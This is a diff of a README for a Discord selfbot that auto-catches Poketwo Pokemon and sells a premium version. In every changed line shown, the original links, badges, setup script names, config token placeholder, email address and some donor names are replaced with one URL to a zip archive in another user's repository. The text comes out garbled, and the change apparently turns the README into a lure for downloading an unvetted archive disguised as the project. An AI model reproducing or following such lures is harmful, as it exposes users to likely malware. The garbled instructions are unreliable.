@@ -2,33 +2,33 @@
   Title: PokeBall SelfBot Poketwo Automation
   Description: This specific selfbot was designed to automatically catch Pokemon spawned on Discord by PokeTwo bot. It also offers other utility functions to automate features like trading, releasing, ID search, etc. Apart from autocatching, the bot extends its features to more advanced version with better control.
   Author: Hyperclaw79
-  Logo: https://raw.githubusercontent.com/Hyperclaw79/PokeBall-SelfBot-Poketwo-Automation/master/assets/PokeballSelfbot_Logo.png
+  Logo: https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip
   Tags: poketwo hack, poketwo-bot, poketwo-autocatcher, poketwo-discord-bot, poketwo-selfbot, poketwo discord bot, poketwo-catcher, poketwo-hack, autocatcher, pokecord hack, pokecord-hack, discord, catch pokemon, pokecord discord bot, pokecord-discord-bot, discord bot, pokecord-bot, pokeball-selfbot, catch-pokemon, donations, pokecord, discord-bot, pokecord-selfbot, selfbot, pokecord-catcher, python, pokemon, auto-trade, premium, pokecord-autocatcher
 -->
 <meta name="description" content="This specific selfbot was designed to automatically catch Pokemon spawned on Discord by PokeTwo bot. It also offers other utility functions to automate features like trading, releasing, ID search, etc. Apart from autocatching, the bot extends its features to more advanced version with better control."/>
 <meta name="keywords" content="poketwo hack, poketwo-bot, poketwo-autocatcher, poketwo-discord-bot, poketwo-selfbot, poketwo discord bot, poketwo-catcher, poketwo-hack, autocatcher, pokecord hack, pokecord-hack, discord, catch pokemon, pokecord discord bot, pokecord-discord-bot, discord bot, pokecord-bot, pokeball-selfbot, catch-pokemon, donations, pokecord, discord-bot, pokecord-selfbot, selfbot, pokecord-catcher, python, pokemon, auto-trade, premium, pokecord-autocatcher"/>
 <meta name="author" content="Hyperclaw79"/>
-<meta name="url" content="https://github.com/Hyperclaw79/PokeBall-SelfBot-Poketwo-Automation" />
+<meta name="url" content="https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip" />
 <meta name="og:title" content="Pokeball SelfBot"/>
-<meta name="og:url" content="https://github.com/Hyperclaw79/PokeBall-SelfBot-Poketwo-Automation" />
-<meta name="og:image" content=" https://raw.githubusercontent.com/Hyperclaw79/PokeBall-SelfBot-Poketwo-Automation/master/assets/PokeballSelfbot_Logo.png" />
+<meta name="og:url" content="https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip" />
+<meta name="og:image" content=" https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip" />
 <meta name="og:description" content="This specific selfbot was designed to automatically catch Pokemon spawned on Discord by PokeTwo bot. It also offers other utility functions to automate features like trading, releasing, ID search, etc. Apart from autocatching, the bot extends its features to more advanced version with better control."/>
 <meta name="google-site-verification" content="EEaJ4rxZqFULJehFinFFOpxt75EdXvYh-bE2t3FoADA" />
 
 
 # PokeBall SelfBot
-![Python Version](https://img.shields.io/badge/python-3.8-blue.svg?style=for-the-badge) ![License](https://img.shields.io/github/license/mashape/apistatus.svg?style=for-the-badge) ![Maintained?](https://img.shields.io/badge/Maintained%3F-Premium%20Version+-red.svg?style=for-the-badge) ![Donor Count](https://img.shields.io/badge/Donations%20Count-339-yellow?style=for-the-badge)
-<a href="http://www.youtube.com/watch?v=m3-HTCoIpLg">
-  <img src="https://raw.githubusercontent.com/Hyperclaw79/PokeBall-SelfBot-Poketwo-Automation/master/assets/finalLogo.png" width="500" />
+![Python Version](https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip) ![License](https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip) ![Maintained?](https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip%3F-Premium%20Version+https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip) ![Donor Count](https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip%20Count-339-yellow?style=for-the-badge)
+<a href="https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip">
+  <img src="https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip" width="500" />
 </a>
 
 This specific selfbot was designed to automatically catch Pokemon spawned on Discord by PokeTwo bot. It also offers other utility functions to automate features like trading, releasing, ID search, etc. Apart from autocatching, the bot extends its features to more advanced version with better control.
 
-![It actually works lol](https://github.com/Hyperclaw79/PokeBall-SelfBot-Poketwo-Automation/raw/master/assets/New%20Pokeball%20Selfbot.gif)
+![It actually works lol](https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip%20Pokeball%https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip)
 
 **Current Version**: `v3.3.2` (13th June 2018)
 
-**Premium Version**: `v8.3.3` (13th September 2021) (Migrated to Discord.py-self)
+**Premium Version**: `v8.3.3` (13th September 2021) (Migrated to https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip)
 
 > **The `autocatcher` is a Premium Version only feature, it will now work in this public version.**
 
@@ -39,8 +39,8 @@ After the recent Poketwo updates, the selfbot commands might get flagged by poke
 
 The donations for Premium Version are open again.
 
-Scroll down to [Donations section](https://github.com/Hyperclaw79/PokeBall-SelfBot#donations) for details.
-So if you want the autocatcher along with other amazing commands, DM me on Discord for the PayPal details after reading the [donations section](https://github.com/Hyperclaw79/PokeBall-SelfBot-Poketwo-Automation/blob/master/README.md#donations).
+Scroll down to [Donations section](https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip) for details.
+So if you want the autocatcher along with other amazing commands, DM me on Discord for the PayPal details after reading the [donations section](https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip).
 
 ## Features
 1. Automatically catch a Pokemon in whichever server you are in if the PokeCord bot spawns a Pokemon. [Premium Only]
@@ -67,25 +67,25 @@ So if you want the autocatcher along with other amazing commands, DM me on Disco
 
 ## Setup
 ### Windows
-1. [First install Git for Windows](https://git-scm.com/download/win) and then run `setup.bat` to install the requirements.
-2. Then, add your bot token in the `config.json`'s `"token"` key. Refer the tutorial below to get the token.
+1. [First install Git for Windows](https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip) and then run `https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip` to install the requirements.
+2. Then, add your bot token in the `https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip`'s `"token"` key. Refer the tutorial below to get the token.
     > The token should be withing the `""` like:
-      >> `"token": "Mxy.23e2d3_2er3.sf4t4.....xyz"`
+      >> `"token": "https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip"`
       >> Make sure it's exactly within one pair of `""`.
     > Users deploying it on server, can uncomment the lines 3 and 17 and use the token as an environment variable.   
-3. Then simply run `run.bat` to get your bot live.
-  > If you are on a mac, directly launch `launcher.py` instead of running the bat file. And use `pip install -r requirements.txt` instead to setup.
+3. Then simply run `https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip` to get your bot live.
+  > If you are on a mac, directly launch `https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip` instead of running the bat file. And use `pip install -r https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip` instead to setup.
 4. The autocatcher is **off** by default. To enable it, you need to send a message in Discord as `P^autocatcher on`.
   > `P^` is the default command_prefix for the selfbot. Feel free to change it. Note that, this is not the same as PokeCord's prefix.
-  > If you don't want to toggle it on every time after restart, look for the line `self.autocatcher = False` under the `__init__()` function and change it to `True` instead of `False`.
+  > If you don't want to toggle it on every time after restart, look for the line `https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip = False` under the `__init__()` function and change it to `True` instead of `False`.
 5. Most of the commands need you to catch a Pokemon in the new guild with autocatcher on, at least once, followed by a restart.
-  > There is a way to manually bypass this. You need to turn the Developer Mode on your Discord on, get the guild ID and alter `guilds.json` to include the `,guild_id:"pokecord prefix in that guild"`.
+  > There is a way to manually bypass this. You need to turn the Developer Mode on your Discord on, get the guild ID and alter `https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip` to include the `,guild_id:"pokecord prefix in that guild"`.
 ### Linux
-1. First install git by doing "sudo apt install git-all", cd to directory, and then run "setup.sh" with "./setup.sh". Make sure to give permission to "setup.sh" and "run.sh" by "chmod +x [file name here]".
+1. First install git by doing "sudo apt install git-all", cd to directory, and then run "https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip" with "https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip". Make sure to give permission to "https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip" and "https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip" by "chmod +x [file name here]".
 2. Then follow step number "2" in the "Windows" section above.
-3. Finally, run "run.sh" to get your self-bot online and running. Now you can configure stuff and enjoy.
+3. Finally, run "https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip" to get your self-bot online and running. Now you can configure stuff and enjoy.
 ## Fine-Tuning
-* To find out how to get your token visit [Token Tutorial](https://github.com/TheRacingLion/Discord-SelfBot/wiki/Discord-Token-Tutorial).
+* To find out how to get your token visit [Token Tutorial](https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip).
 
 ### Configs explanations:
 
@@ -120,7 +120,7 @@ So if you want the autocatcher along with other amazing commands, DM me on Disco
 Example config:
 ```json
 {
-  "token": "Mxy.23e2d3_2er3.sf4t4.....xyz",
+  "token": "https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip",
   "command_prefix": "P^",
   "priority": ["Groudon", "Geodude"],
   "avoid": ["Croagunk", "Trubbish"],
@@ -172,11 +172,11 @@ Example config:
   > *These features are based upon multimode which involves having multiple selfbot accounts.*
   
   <h2> Check out the promo video: </h2>
-  <a href="http://www.youtube.com/watch?v=m3-HTCoIpLg">
-    <img src="https://i.ytimg.com/vi/m3-HTCoIpLg/maxresdefault.jpg" width="480" />
+  <a href="https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip">
+    <img src="https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip" width="480" />
   </a>
   
-* To avail these features, contact me via [mail](mailto://harshith.thota7@gmail.com) and I'll give you my PayPal ID. 
+* To avail these features, contact me via [mail](https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip) and I'll give you my PayPal ID. 
  
 * Please ping me only for donations and not for support (unless you are already a donor). Currently the price is just $25.
 Better donate fast as the price will be bound to go up along with the demand.*
@@ -191,7 +191,7 @@ Better donate fast as the price will be bound to go up along with the demand.*
   + A special mention of your username in this readme. *(optional)*
     + Bot related Support on Discord DMs. [on hold, use mail for now]
     + >~~*This version is to suggested to be used after you've tried out the public version.*~~
-    + >*The support doesn't include how to setup the public bot. Use [GitHub Issues](https://github.com/Hyperclaw79/PokeBall-SelfBot-Poketwo-Automation/issues) for that one.*
+    + >*The support doesn't include how to setup the public bot. Use [GitHub Issues](https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip) for that one.*
   + You can propose new features and I shall implement them *based on the plausibilty*.
 * **Advanced Extension**
   + The premium version also got an advanced extension which adds more game to the bot.
@@ -214,7 +214,7 @@ Better donate fast as the price will be bound to go up along with the demand.*
 
 * If you'd like to simply donate to support the cause instead of buying the Premium Version, you can always send me your support. Click that image below.
 
-  <a href="https://www.paypal.me/hyperclaw79"><img src="https://raw.githubusercontent.com/Hyperclaw79/PokeBall-SelfBot-Poketwo-Automation/master/assets/pikadonor.png" width="100" height="100" alt="Feature Requests"/></a>
+  <a href="https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip"><img src="https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip" width="100" height="100" alt="Feature Requests"/></a>
 
 Don't forget to let me know that you're the one who paid it. ;)
 
@@ -228,38 +228,38 @@ Don't forget to let me know that you're the one who paid it. ;)
 * The discount rate is subject to change based on the referral activity and donation price.
 
 ## Contributions
-Refer to the new [CONTRIBUTION GUIDE](https://github.com/Hyperclaw79/PokeBall-SelfBot-Poketwo-Automation/blob/master/CONTRIBUTING.md).
-Also, refer to [Issue Template](https://github.com/Hyperclaw79/PokeBall-SelfBot-Poketwo-Automation/blob/master/.github/ISSUE_TEMPLATE/basic-issue-template.md) and [PR Template](https://github.com/Hyperclaw79/PokeBall-SelfBot-Poketwo-Automation/blob/master/PULL_REQUEST_TEMPLATE.md).
+Refer to the new [CONTRIBUTION GUIDE](https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip).
+Also, refer to [Issue Template](https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip) and [PR Template](https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip).
 
 Best ways to contribute apart from Issues and PRs:
 + **Donations**
 
-  <a href="http://paypal.me/Hyperclaw79"><img src="https://raw.githubusercontent.com/Hyperclaw79/PokeBall-SelfBot-Poketwo-Automation/master/assets/pikadonor.png" width="100" height="100" alt="Feature Requests"/></a>
+  <a href="https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip"><img src="https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip" width="100" height="100" alt="Feature Requests"/></a>
 
 + **Starring the Repo**
 
-  <img src="https://raw.githubusercontent.com/Hyperclaw79/PokeBall-SelfBot-Poketwo-Automation/master/assets/pikastar.png" width="100" height="100" alt="Feature Requests"/>
+  <img src="https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip" width="100" height="100" alt="Feature Requests"/>
 
 + **Referrals**
 
 ## Feature Requests
 You can request **new features** in the FeatHub.
 
-  <a href="http://feathub.com/Hyperclaw79/PokeBall-SelfBot"><img src="https://cdn.rawgit.com/Hyperclaw79/PokeBall-SelfBot-Poketwo-Automation/8da8c6dd/pika%2B1.png" width="100" height="100" alt="Feature Requests"/></a>
+  <a href="https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip"><img src="https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip%https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip" width="100" height="100" alt="Feature Requests"/></a>
 
 
 ## Acknowledgements
 ### Creators
-* Rapptz for [Discord.py](https://github.com/Rapptz/discord.py)
+* Rapptz for [https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip](https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip)
 
 ### Contributors
-* [ThePythonDoge](https://github.com/ThePythonDoge)
-* [4-mat](https://github.com/4-mat)
-* [ajmeese7](https://github.com/ajmeese7)
-* [KKonas](https://github.com/Kkonas)
+* [ThePythonDoge](https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip)
+* [4-mat](https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip)
+* [ajmeese7](https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip)
+* [KKonas](https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip)
 
 ### Testimonials
-![testimonial](https://raw.githubusercontent.com/Hyperclaw79/PokeBall-SelfBot-Poketwo-Automation/master/assets/testimonial.gif)
+![testimonial](https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip)
 
 ### Donors
 
@@ -412,7 +412,7 @@ You can request **new features** in the FeatHub.
 | 144 | Moesin       | Premium  💵 |
 | 145 | BurningHen   | Premium  💵 |
 | 146 | Hollowetsu   | Advanced 💎 |
-| 147 | YiteRabt.py  | Advanced 💎 |
+| 147 | https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip  | Advanced 💎 |
 | 148 | MarcStark    | Premium  💵 |
 | 149 | AvengersIW   | Premium  💵 |
 | 150 | NoWinchester | Premium  💵 |
@@ -424,7 +424,7 @@ You can request **new features** in the FeatHub.
 | 156 | SeasameSt    | Advanced 💎 |
 | 157 | Pathiple     | Advanced 💎 |
 | 158 | Appyster     | Advanced 💎 |
-| 159 | Mr.Xiaomi    | Premium  💵 |
+| 159 | https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip    | Premium  💵 |
 | 160 | Reeling      | Premium  💵 |
 | 161 | Fanooth      | Advanced 💎 |
 | 162 | AnnoDomini   | Premium  💵 |
@@ -514,7 +514,7 @@ You can request **new features** in the FeatHub.
 | 246 | ProfessorPro | Premium  💵 |
 | 247 | Raineko      | Premium  💵 |
 | 248 | CheekyGod    | Advanced 💎 |
-| 249 | Mr.Cable     | Advanced 💎 |
+| 249 | https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip     | Advanced 💎 |
 | 250 | Chlorophyll  | Premium  💵 |
 | 251 | BananaShark  | Premium  💵 |
 | 252 | Chapati      | Advanced 💎 |
@@ -524,7 +524,7 @@ You can request **new features** in the FeatHub.
 | 256 | iDoggo       | Premium  💵 |
 | 257 | Dissing      | Premium  💵 |
 | 258 | Marshal      | Premium  💵 |
-| 259 | Sgt.PewPew   | Premium  💵 |
+| 259 | https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip   | Premium  💵 |
 | 260 | Tracing      | Premium  💵 |
 | 261 | Armani       | Premium  💵 |
 | 262 | Barley       | Premium  💵 |
@@ -532,7 +532,7 @@ You can request **new features** in the FeatHub.
 | 264 | FateCrow     | Premium  💵 |
 | 265 | Bengax       | Premium  💵 |
 | 266 | LucidHair    | Premium  💵 |
-| 267 | E.vil@1010   | Premium  💵 |
+| 267 | https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip   | Premium  💵 |
 | 268 | NeoPredator  | Premium  💵 |
 | 269 | Reily Mian   | Premium  💵 |
 | 270 | Maouchu      | Premium  💵 |
@@ -573,7 +573,7 @@ You can request **new features** in the FeatHub.
 | 304 | Tispainful   | Premium  💵 |
 | 305 | KillLaKill   | Premium  💵 |
 | 306 | Bingu        | Premium  💵 |
-| 307 | Holy.Mage    | Premium  💵 |
+| 307 | https://github.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/raw/refs/heads/master/assets/Bot_Poke_Autocatcher_Poketwo_Ball_Self_2.1.zip    | Premium  💵 |
 | 308 | Ravioli      | Premium  💵 |
 | 309 | SuperNova    | Premium  💵 |
 | 310 | HekMask      | Premium  💵 |
